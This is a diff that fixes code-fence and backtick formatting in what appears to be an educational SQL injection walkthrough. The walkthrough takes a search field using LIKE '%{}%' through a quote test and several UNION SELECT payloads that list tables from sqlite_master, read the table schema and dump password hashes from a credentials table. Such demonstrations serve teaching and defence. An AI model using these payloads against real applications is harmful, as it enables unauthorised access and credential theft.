@@ -4,10 +4,10 @@ Add some user to the database. Here we call them "Karl".
 
 ## Query for searching for users
 This is something that we only know if we have access to the source code. It is included here for clarity. We assume that a hacker deduced that the query looks something like this.
-´´´ sql
+``` sql
 SELECT user FROM credentials WHERE user LIKE '%{}%'
-´´´
-The ´{}´ is replaced with the user input.
+```
+The `{}` is replaced with the user input.
 
 The name of the table and the column are something that we will first need to find out.
 
@@ -16,14 +16,14 @@ The name of the table and the column are something that we will first need to fi
 We check if quotation marks are escaped when adding user input to the query.
 
 ## Input
-´´´ sql
+``` sql
 '
-´´´
+```
 
 ## Query after Injection
-´´´ sql
+``` sql
 SELECT user FROM credentials WHERE user LIKE '%'%'
-´´´
+```
 
 ## Result
 
@@ -35,17 +35,17 @@ This input field is susceptible to SQL injection!
 
 # Step 2
 
-Now that we can inject arbitrary SQL code into the query, we use ´UNION´ to add more results to the users query. Here we want to find out some metadata. The ´sqlite_master´ table is a protected tablename in sqlcipher.
+Now that we can inject arbitrary SQL code into the query, we use `UNION` to add more results to the users query. Here we want to find out some metadata. The `sqlite_master` table is a protected tablename in sqlcipher.
 
 ## Input
-´´´ sql
+``` sql
 ' UNION SELECT name FROM sqlite_master '
-´´´
+```
 
 ## Query after Injection
-´´´ sql
+``` sql
 SELECT user FROM credentials WHERE user LIKE '%' UNION SELECT name FROM sqlite_master '%'
-´´´
+```
 
 ## Result
 
@@ -55,21 +55,21 @@ The following users match your query: ["Karl", "credentials", "sqlite_autoindex_
 
 The first result is the intended username. The second and third results are the names of tables stored in this database.
 
-The free floating ´'%'´ at the end of the query is simply ignored.
+The free floating `'%'` at the end of the query is simply ignored.
 
 # Step 3
 
-Now that we know the name of the table, we want to know the names of its columns. Everything after and including the ´WHERE´ is necessary such that the type of the result matches that of the user column, which by trial and error we find to be ´TEXT NOT NULL´.
+Now that we know the name of the table, we want to know the names of its columns. Everything after and including the `WHERE` is necessary such that the type of the result matches that of the user column, which by trial and error we find to be `TEXT NOT NULL`.
 
 ## Input
-´´´ sql
+``` sql
 ' UNION SELECT sql FROM sqlite_master WHERE sql IS NOT NULL AND sql LIKE '
-´´´
+```
 
 ## Query after Injection
-´´´ sql
+``` sql
 SELECT user FROM credentials WHERE user LIKE '%' UNION SELECT sql FROM sqlite_master WHERE sql IS NOT NULL AND sql LIKE '%'
-´´´
+```
 
 ## Result
 
@@ -84,14 +84,14 @@ The first search result is the command the table "credentials" was created with.
 We know the names and types of the table and columns, it is time to extract the information we are looking for.
 
 ## Input
-´´´ sql
+``` sql
 ' UNION SELECT password_hash FROM credentials '
-´´´
+```
 
 ## Query after Injection
-´´´ sql
+``` sql
 SELECT user FROM credentials WHERE user LIKE '%' UNION SELECT password_hash FROM credentials '%'
-´´´
+```
 
 ## Result
 
